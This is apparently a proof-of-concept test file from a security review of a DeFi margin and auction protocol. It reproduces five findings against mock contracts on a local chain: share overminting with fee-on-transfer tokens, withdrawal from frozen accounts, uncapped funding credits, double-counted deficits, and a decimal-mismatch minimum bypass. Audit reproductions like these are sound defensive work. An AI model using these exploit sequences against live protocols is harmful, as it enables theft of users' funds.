import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import solc from 'solc';
import { AbiCoder, ContractFactory, keccak256 } from 'ethers';
import {
  WAD,
  accountIdOf,
  deploy,
  deploySystem,
  expectCustomRevert,
  increaseTime,
  openAndFund,
  receipt,
} from '../../blind-run/poc/support.mjs';

const MAX_PRICE = (1n << 128n) - 1n;

function bidDigest(auctionId, bidderAccount, baseAmount, limitPrice, salt) {
  return keccak256(new AbiCoder().encode(
    ['uint256', 'uint256', 'uint256', 'uint256', 'bytes32'],
    [auctionId, bidderAccount, baseAmount, limitPrice, salt],
  ));
}

function compileReviewerVenue() {
  const filename = path.join(import.meta.dirname, 'ReviewerVenue.sol');
  const sourceKey = 'blind-review/reviewer-a/ReviewerVenue.sol';
  const input = {
    language: 'Solidity',
    sources: { [sourceKey]: { content: fs.readFileSync(filename, 'utf8') } },
    settings: {
      optimizer: { enabled: true, runs: 300 },
      viaIR: true,
      evmVersion: 'shanghai',
      metadata: { bytecodeHash: 'none' },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors ?? []).filter((item) => item.severity === 'error');
  assert.equal(errors.length, 0, errors.map((item) => item.formattedMessage).join('\n'));
  const artifact = output.contracts[sourceKey].ReviewerVenue;
  return { abi: artifact.abi, bytecode: `0x${artifact.evm.bytecode.object}` };
}

test('RA-002 nominal insurance deposit overmints shares against the observed receipt', async () => {
  const s = await deploySystem();
  const unit = 1_000n * 10n ** 6n;
  await receipt(s.token.mint(await s.shareholder.getAddress(), unit));
  await receipt(s.token.connect(s.shareholder).approve(await s.insurance.getAddress(), unit));
  await receipt(s.insurance.connect(s.shareholder).deposit(unit, await s.shareholder.getAddress()));

  await receipt(s.token.setTransferFee(1_000));
  await receipt(s.token.mint(await s.trader.getAddress(), unit));
  await receipt(s.token.connect(s.trader).approve(await s.insurance.getAddress(), unit));
  const before = await s.token.balanceOf(await s.insurance.getAddress());
  await receipt(s.insurance.connect(s.trader).deposit(unit, await s.trader.getAddress()));
  const receivedWad = (await s.token.balanceOf(await s.insurance.getAddress()) - before) * 10n ** 12n;
  const attackerShares = await s.insurance.balanceOf(await s.trader.getAddress());
  assert.equal(receivedWad, 900n * WAD);
  assert.equal(attackerShares, 1_000n * WAD);
  console.log(JSON.stringify({ reviewerId: 'RA-002', receivedWad: `${receivedWad}`, mintedShares: `${attackerShares}` }));
});

test('RA-003 stable gas-headroom reproduction closes frozen-account withdrawal impact', async () => {
  const s = await deploySystem();
  const id = await openAndFund(s, s.trader, 1_000n * 10n ** 6n);
  await receipt(s.vault.connect(s.trader).requestWithdrawal(id, 900n * WAD, await s.trader.getAddress()));
  await receipt(s.router.connect(s.trader).executePortfolio(id, [[1, WAD, 2_000n * WAD]], 2_000n * WAD, true));
  await receipt(s.feed.setAnswer(1_000n * 10n ** 8n, { gasLimit: 200_000n }));
  await increaseTime(s.eip1193, 61);
  await receipt(s.auction.start(id, 1));
  assert.equal(await s.clearing.frozen(id), true);
  assert.ok(await s.clearing.accountEquity(id) < await s.clearing.accountMaintenance(id));
  await expectCustomRevert(
    s.clearing.connect(s.trader).withdrawMargin(id, 900n * WAD, await s.trader.getAddress()),
    'controller route must reject frozen account',
  );
  const before = await s.token.balanceOf(await s.trader.getAddress());
  await receipt(s.vault.connect(s.other).claimWithdrawal(id));
  const extracted = await s.token.balanceOf(await s.trader.getAddress()) - before;
  assert.equal(extracted, 900n * 10n ** 6n);
  console.log(JSON.stringify({ reviewerId: 'RA-003', frozen: true, unhealthy: true, extractedNative: `${extracted}` }));
});

test('RA-007 uncapped negative growth reaches attacker-controlled account cash', async () => {
  const s = await deploySystem();
  await receipt(s.clearing.setFees(0));
  // 200k notional carries 20k base margin plus the 25k concentration charge.
  const id = await openAndFund(s, s.trader, 45_000n * 10n ** 6n);
  const base = 100n * WAD;
  await receipt(s.router.connect(s.trader).executePortfolio(id, [[1, base, 2_000n * WAD]], 2_000n * WAD, true));
  const markerId = await openAndFund(s, s.other, 1n * 10n ** 6n);
  await receipt(s.router.connect(s.other).executePortfolio(markerId, [[1, 1n, 1_000n * WAD]], 1_000n * WAD, true));
  const state0 = await s.funding.funding(1);
  await increaseTime(s.eip1193, 61);
  await receipt(s.funding.accrue(1));
  const state1 = await s.funding.funding(1);
  const elapsed = state1.lastAccrued - state0.lastAccrued;
  const maxMagnitude = BigInt(state1.maxRatePerSecond) * elapsed;
  const cash0 = await s.clearing.cashBalance(id);
  await receipt(s.clearing.settleAccountFunding(id, 1));
  const credit = await s.clearing.cashBalance(id) - cash0;
  const cappedCredit = base * maxMagnitude / WAD;
  assert.ok(credit > cappedCredit * 1_000n);
  const token0 = await s.token.balanceOf(await s.trader.getAddress());
  await receipt(s.clearing.connect(s.trader).withdrawMargin(id, 40n * WAD, await s.trader.getAddress()));
  const unlockedNative = await s.token.balanceOf(await s.trader.getAddress()) - token0;
  assert.equal(unlockedNative, 40n * 10n ** 6n);
  assert.ok(cappedCredit < 40n * WAD);
  console.log(JSON.stringify({ reviewerId: 'RA-007', cashCredit: `${credit}`, symmetricCapCredit: `${cappedCredit}`, multipleFloor: `${credit / cappedCredit}`, collateralUnlockedNative: `${unlockedNative}` }));
});

test('RA-017 residual finalization can recount one unchanged uncovered deficit', async () => {
  const s = await deploySystem();
  await receipt(s.clearing.setFees(0));
  await receipt(s.auction.setTiming(30, 1));
  const distressed = await openAndFund(s, s.victim, 300n * 10n ** 6n);
  await receipt(s.router.connect(s.victim).executePortfolio(distressed, [[1, WAD, 2_000n * WAD]], 2_000n * WAD, true));
  await receipt(s.feed.setAnswer(1_000n * 10n ** 8n, { gasLimit: 200_000n }));
  await receipt(s.auction.start(distressed, 1));
  await receipt(s.vault.connect(s.bidder).openAccount());
  const bidderId = await accountIdOf(s.bidder);
  const salt = keccak256(new TextEncoder().encode('review-repeat'));
  await receipt(s.auction.connect(s.bidder).commit(1, bidderId, bidDigest(1n, bidderId, WAD, MAX_PRICE, salt), 0));
  await increaseTime(s.eip1193, 29);
  await receipt(s.auction.connect(s.bidder).reveal(1, WAD, MAX_PRICE, salt));
  await receipt(s.feed.setAnswer(900n * 10n ** 8n, { gasLimit: 200_000n }));

  await receipt(s.auction.start(bidderId, 1));
  await increaseTime(s.eip1193, 31);
  await receipt(s.auction.finalize(2));
  const first = await s.insurance.pendingSocialLoss();
  assert.ok(first > 0n);
  const equityBeforeRepeat = await s.clearing.accountEquity(bidderId);

  await receipt(s.auction.start(bidderId, 1));
  await increaseTime(s.eip1193, 31);
  await receipt(s.auction.finalize(3));
  const second = await s.insurance.pendingSocialLoss();
  assert.equal(await s.clearing.accountEquity(bidderId), equityBeforeRepeat);
  assert.equal(second, first * 2n);
  assert.equal((await s.clearing.position(bidderId, 1)).base, WAD);
  console.log(JSON.stringify({ reviewerId: 'RA-017', firstPending: `${first}`, secondPending: `${second}`, unchangedEquity: `${equityBeforeRepeat}`, residualBase: `${WAD}` }));
});

test('RA-024 honest output receipt still bypasses wad minimum through native-unit comparison', async () => {
  const s = await deploySystem();
  const tokenOut = await deploy('MockERC20', s.governor, ['24 Decimal Output', 'O24', 24]);
  const outputNative = WAD;
  const artifact = compileReviewerVenue();
  const venue = await new ContractFactory(artifact.abi, artifact.bytecode, s.governor)
    .deploy(await tokenOut.getAddress(), outputNative);
  await venue.waitForDeployment();
  await receipt(s.insurance.configure(await s.clearing.getAddress(), await s.auction.getAddress(), await venue.getAddress()));
  await receipt(tokenOut.mint(await venue.getAddress(), outputNative));
  const input = 100n * 10n ** 6n;
  await receipt(s.token.mint(await s.insurance.getAddress(), input));
  const before = await tokenOut.balanceOf(await s.insurance.getAddress());
  await receipt(s.insurance.rebalance(await tokenOut.getAddress(), input, WAD, '0x'));
  const receivedNative = await tokenOut.balanceOf(await s.insurance.getAddress()) - before;
  const normalizedWad = receivedNative / 10n ** 6n;
  assert.equal(receivedNative, outputNative);
  assert.equal(normalizedWad, 10n ** 12n);
  assert.ok(normalizedWad < WAD);
  assert.equal(await s.insurance.accruedProtocolValue(), WAD);
  console.log(JSON.stringify({ reviewerId: 'RA-024', receivedNative: `${receivedNative}`, normalizedWad: `${normalizedWad}`, acceptedMinimumWad: `${WAD}` }));
});
